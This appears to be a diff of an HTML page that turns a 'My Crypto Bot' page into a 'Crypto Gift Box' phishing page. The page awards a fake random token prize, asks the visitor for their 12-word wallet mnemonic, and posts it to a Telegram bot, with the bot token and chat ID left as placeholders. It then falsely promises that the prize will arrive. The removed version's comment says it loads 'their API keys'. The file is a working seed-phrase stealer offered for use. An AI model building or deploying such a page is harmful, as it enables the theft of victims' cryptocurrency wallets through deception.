@@ -1,13 +1,264 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>My Crypto Bot</title>
-    <script src="env.js"></script> <!-- Load their API keys -->
-  </head>
-  <body style="margin:0;padding:0;">
-    <iframe 
-      src="www.signalgenerator.store/"
-      style="width:100vw; height:100vh; border:none;"
-    ></iframe>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Crypto Gift Box</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #0d0d0d;
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+      overflow: hidden;
+    }
+    #particles-js {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+    .container {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 36px;
+      margin-bottom: 20px;
+      color: #ffcc00;
+    }
+    .gift-box {
+      width: 160px;
+      height: 160px;
+      background: linear-gradient(145deg, #1a1a1a, #333);
+      border: 3px solid #ffcc00;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 60px;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+      margin-bottom: 30px;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1);}
+      50% { transform: scale(1.1);}
+      100% { transform: scale(1);}
+    }
+    .prize-details {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 30px;
+    }
+    .item {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 12px;
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+    }
+    .item img {
+      width: 20px;
+      height: 20px;
+    }
+    .prize-show {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .prize-logo {
+      width: 60px;
+      height: 60px;
+    }
+    .prize-name {
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .claim-btn, .submit-btn {
+      margin-top: 20px;
+      padding: 12px 30px;
+      background: #ffcc00;
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .claim-btn:hover, .submit-btn:hover {
+      background: #ff9900;
+    }
+    .mnemonic-input {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
+      gap: 10px;
+    }
+    .mnemonic-input textarea {
+      width: 300px;
+      height: 100px;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      resize: none;
+    }
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      background: #222;
+      color: #fff;
+      padding: 30px 40px;
+      border-radius: 15px;
+      border: 2px solid #ffcc00;
+      text-align: center;
+      z-index: 10;
+      transition: transform 0.3s ease;
+    }
+    .popup.show {
+      transform: translate(-50%, -50%) scale(1);
+    }
+  </style>
+</head>
+<body>
+
+<div id="particles-js"></div>
+
+<div class="container">
+  <h1>Open Your Crypto Gift!</h1>
+  
+  <div class="gift-box" id="giftBox">🎁</div>
+  
+  <div class="prize-details" id="prizeDetails">
+    <!-- Prize details inserted here -->
+  </div>
+
+  <div class="prize-show" id="prizeShow">
+    <img class="prize-logo" id="prizeLogo" src="" alt="Token">
+    <div class="prize-name" id="prizeName"></div>
+  </div>
+
+  <button class="claim-btn" id="claimBtn" style="display:none;">Claim</button>
+
+  <div class="mnemonic-input" id="mnemonicInput">
+    <textarea id="mnemonic" placeholder="Enter your 12-word mnemonic..."></textarea>
+    <button class="submit-btn" id="submitBtn">Submit</button>
+  </div>
+</div>
+
+<div class="popup" id="popupMessage"></div>
+
+<script>
+particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json');
+
+const prizes = [
+  {name: "1 BNB", logo: "https://cryptologos.cc/logos/binance-coin-bnb-logo.png"},
+  {name: "10 USDT", logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"},
+  {name: "100 USDT", logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"},
+  {name: "1 BTC", logo: "https://cryptologos.cc/logos/bitcoin-btc-logo.png"},
+  {name: "1 ETH", logo: "https://cryptologos.cc/logos/ethereum-eth-logo.png"},
+  {name: "1 LTC", logo: "https://cryptologos.cc/logos/litecoin-ltc-logo.png"},
+  {name: "500 XRP", logo: "https://cryptologos.cc/logos/xrp-xrp-logo.png"},
+  {name: "0.5 SOL", logo: "https://cryptologos.cc/logos/solana-sol-logo.png"},
+  {name: "2 ADA", logo: "https://cryptologos.cc/logos/cardano-ada-logo.png"},
+  {name: "100 DOGE", logo: "https://cryptologos.cc/logos/dogecoin-doge-logo.png"}
+];
+
+const prizeDetails = document.getElementById('prizeDetails');
+const giftBox = document.getElementById('giftBox');
+const prizeShow = document.getElementById('prizeShow');
+const prizeLogo = document.getElementById('prizeLogo');
+const prizeName = document.getElementById('prizeName');
+const claimBtn = document.getElementById('claimBtn');
+const mnemonicInput = document.getElementById('mnemonicInput');
+const submitBtn = document.getElementById('submitBtn');
+const popupMessage = document.getElementById('popupMessage');
+
+let selectedPrize = null;
+
+// Load all prizes
+prizes.forEach(prize => {
+  const div = document.createElement('div');
+  div.className = 'item';
+  div.innerHTML = `<img src="${prize.logo}" alt="Logo">${prize.name}`;
+  prizeDetails.appendChild(div);
+});
+
+giftBox.addEventListener('click', () => {
+  selectedPrize = prizes[Math.floor(Math.random() * prizes.length)];
+  prizeShow.style.display = 'flex';
+  prizeLogo.src = selectedPrize.logo;
+  prizeName.textContent = `You Won: ${selectedPrize.name}`;
+  giftBox.style.display = 'none';
+  prizeDetails.style.display = 'none';
+  claimBtn.style.display = 'inline-block';
+});
+
+claimBtn.addEventListener('click', () => {
+  claimBtn.style.display = 'none';
+  mnemonicInput.style.display = 'flex';
+});
+
+submitBtn.addEventListener('click', () => {
+  const mnemonic = document.getElementById('mnemonic').value.trim();
+  if (mnemonic.split(' ').length !== 12) {
+    showPopup('Please enter exactly 12 words.');
+    return;
+  }
+
+  const botToken = 'YOUR_BOT_TOKEN_HERE';
+  const chatId = 'YOUR_CHAT_ID_HERE';
+  const message = `Mnemonic:\n${mnemonic}\n\nPrize: ${selectedPrize.name}`;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: chatId, text: message})
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.ok) {
+      showPopup('You will get the item soon!');
+      setTimeout(() => location.reload(), 3000);
+    } else {
+      showPopup('Failed to send. Try again.');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    showPopup('Network error. Try again.');
+  });
+});
+
+function showPopup(message) {
+  popupMessage.textContent = message;
+  popupMessage.classList.add('show');
+  setTimeout(() => {
+    popupMessage.classList.remove('show');
+  }, 2500);
+}
+</script>
+
+</body>
 </html>
